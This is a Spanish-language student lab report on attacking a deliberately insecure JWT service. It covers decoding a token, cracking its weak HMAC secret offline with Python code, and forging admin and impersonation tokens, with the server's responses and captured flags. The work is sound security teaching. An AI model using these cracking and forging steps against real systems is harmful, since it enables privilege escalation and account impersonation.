# Entregable — Lab Extra 5: JWT inseguro

**Grupo:** 05 · **Integrantes:**
- Magni, Gastón (@nosungam)
- Mosconi, Ignacio (@ignamosconi)
- Presuttari, Matías (@matiaspresuttari)
- Terreno, Valentino (@vterreno)

**Declaración de uso de IA:** Se utilizó un asistente de IA (DeepSeek) para
revisar la redacción del informe, ordenar las explicaciones y proponer el
esqueleto de algunas respuestas. El código de `jwt_tool.py` se implementó y se
ejecutó localmente, y cada salida que aparece en este informe se generó contra
el servidor del lab; las salidas crudas están en `evidencia/salidas/`. Las
fuentes del research se verificaron contra el documento original antes de
citarlas. El grupo revisó y comprendió cada afirmación antes de entregarla.

---

## 1. Anatomía del token real

Token obtenido con `GET /login?user=diego&pass=diego123` (guardado en
`evidencia/salidas/r1_login.json`):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzk0MDY3MjE1LCJleHAiOjE3OTQwNzA4MTUsIm5vdGFfaW50ZXJuYSI6ImRlcGxveS10YWcgRkxBR3tqd3Rfc29sb19iYXNlNjR9In0.YBqE8MFbo4jyD5804qdjrFVEjJlJx4lBx3zZI6gVgYA
```

Decodificado con `python3 entregas/labextra5/grupo05/jwt_tool.py decodificar`:

```
HEADER:  {
  "alg": "HS256",
  "typ": "JWT"
}
PAYLOAD: {
  "sub": "diego",
  "role": "user",
  "iat": 1794067215,
  "exp": 1794070815,
  "nota_interna": "deploy-tag FLAG{jwt_solo_base64}"
}
FIRMA:   601a84f0c15ba388f20f9f34e2a763ac…
```

**R1 — claim problemático:** `nota_interna`. El token viaja en base64url, no
cifrado: cualquiera que lo vea (consola, logs, proxy, DevTools) lee el payload
completo y con él la flag `FLAG{jwt_solo_base64}`. La firma no protege la
confidencialidad. Además, el prefijo `deploy-tag` sugiere que se está filtrando
metadata de despliegue interna.

## 2. Crack offline del secreto

**El oráculo, en una oración:** dado un token válido, cada candidato de secreto
se prueba localmente recalculando `HMAC-SHA256(candidato, "cabecera.payload")` y
comparándolo con la firma del token; si coincide, el candidato es el secreto.

```python
def firma_es_valida(token: str, secreto: bytes) -> bool:
    try:
        cab, payload, firma = token.split(".")
    except ValueError:
        return False
    esperada = b64url(
        hmac.new(secreto, f"{cab}.{payload}".encode(), hashlib.sha256).digest()
    )
    # compare_digest evita filtrar por temporización en qué byte difiere.
    return hmac.compare_digest(firma, esperada)
```

`crackear_secreto()` recorre `caso/diccionario.txt` línea por línea y llama a
`firma_es_valida()` con cada palabra. No hay ninguna petición HTTP: el servidor
no participa y no puede rate-limitar, loguear ni bloquear nada.

- **Secreto encontrado:** `mate123` (`evidencia/salidas/r2_crackeo.txt`).
- **Candidatos probados:** 11. `mate123` es la línea 11 del diccionario; las 10
  anteriores (`password`, `123456`, `qwerty`, … `mate`) fallaron.
- **Tiempo:** ~0,02 s en total, incluyendo el arranque del intérprete Python.
  El costo real por candidato es una sola operación HMAC-SHA256 más una
  comparación; con 31 palabras el ataque es instantáneo.
- **¿Qué cambiaría con un secreto de 32 bytes aleatorios?** El diccionario
  dejaría de servir: el espacio de búsqueda pasa a 2^256 y no hay atajo. El
  ataque offline seguiría siendo *posible en teoría* (la firma es pública y se
  puede verificar localmente), pero dejaría de ser *factible*. La diferencia es
  de entropía, no de algoritmo: HMAC-SHA256 está bien; lo que estaba mal era la
  clave. Un secreto de diccionario convierte un espacio de 2^256 en uno de 31
  posibilidades.

## 3. Las dos forjas

### R2 — Escalada vertical (`role=admin`)

Token forjado con `jwt_tool.py forjar mate123 --sub diego --role admin`
(`evidencia/salidas/r2_token_admin.txt`):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDA2NzIxNSwiZXhwIjoxNzk0MDcwODE1fQ.-ZG9UU2e9jacqozrPnGplmoAB4u1lFmOi9x0GOCg5iA
```

Respuesta de `/admin` con ese token (`evidencia/salidas/r2_admin_flag.txt`):

```
HTTP/1.0 200 OK
Content-Type: application/json; charset=utf-8

{"panel": "admin", "auditoria": "FLAG{jwt_forjado_admin}"}
```

**Diff conceptual:** el token original tenía `"role": "user"`; el forjado tiene
`"role": "admin"`. También se quitaron `nota_interna` y se regeneraron `iat` y
`exp`. La firma cambió porque cambió el mensaje firmado. No se tocó el servidor
ni la cuenta: el servidor aceptó el token porque la firma era válida con el
secreto recuperado.

### R3 — Suplantación horizontal (`sub=maria`)

Token forjado con `--sub maria --role user` (`evidencia/salidas/r3_token_maria.txt`):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtYXJpYSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzk0MDY3MjE1LCJleHAiOjE3OTQwNzA4MTV9.sWsirLt22Pab9BNCA0_RWXwe3CTCY_vxTjHyBflMelU
```

Respuesta de `/perfil` (`evidencia/salidas/r3_perfil_maria.txt`):

```
HTTP/1.0 200 OK
Content-Type: application/json; charset=utf-8

{"usuario": "maria", "role": "user", "datos": "Legajo 1007 — Finanzas. Nota confidencial: FLAG{jwt_suplantacion_idor}"}
```

**¿Por qué es un IDOR aunque no haya `?id=`?** Porque el identificador del
objeto no desapareció: se mudó al claim `sub`. `/perfil` toma `payload["sub"]` y
busca ese usuario sin comprobar que el sujeto autenticado sea el mismo que el
recurso pedido. En un IDOR clásico se cambia `?id=1042` por `?id=1007`; acá se
cambia `sub=diego` por `sub=maria` y se vuelve a firmar. La causa raíz es la
misma —falta de autorización a nivel de objeto—, pero el parámetro ahora está
dentro de una estructura que el servidor trata como identidad confiable. Como
el atacante tiene el secreto, puede fabricar cualquier identidad.

## 4. Control de sanidad

El servidor **sí rechaza** los tokens inválidos, lo que confirma que el éxito
anterior no fue un endpoint abierto sino una falla de la clave:

**(a) Token real de diego en `/admin` → 403** (`sanidad_admin_403.txt`):

```
HTTP/1.0 403 Forbidden

{"error": "solo administradores"}
```

**(b) Token forjado con un carácter cambiado en la firma → 401**
(`sanidad_firma_401.txt`):

```
HTTP/1.0 401 Unauthorized

{"error": "token invalido o expirado"}
```

También se probó `alg:none` con firma vacía (P4): el servidor respondió 401
(`p4_alg_none_401.txt`), porque verifica siempre HMAC-SHA256 y no confía en el
`alg` del header.
